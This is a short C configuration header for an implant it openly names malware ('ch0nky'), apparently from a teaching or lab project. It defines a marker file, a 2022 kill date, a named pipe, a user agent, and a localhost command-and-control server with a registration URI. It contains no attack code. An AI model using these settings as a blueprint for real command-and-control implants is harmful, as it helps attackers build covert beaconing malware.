#ifndef CONFIG_H_
#define CONFIG_H_

#define DEBUG 1

#if DEBUG == 1
#include <stdio.h>
#define LOG wprintf
#else
#define LOG void
#endif


#define MALWARE_FILE_EXISTS_STRING "C:\\malware\\ch0nky.txt"
#define MALWARE_KILL_DATE_DAY 1 
#define MALWARE_KILL_DATE_MONTH 1 
#define MALWARE_KILL_DATE_YEAR 2022 
#define MALWARE_NAMED_PIPE "ch0nky"

#define MALWARE_USER_AGENT L"ch0nky"
#define MALWARE_C2_SERVER_ADDRESS L"http://127.0.0.1"
#define MALWARE_C2_SERVER_PORT 5000
#define MALWARE_C2_SERVER_REGISTER_URI L"/register"

#endif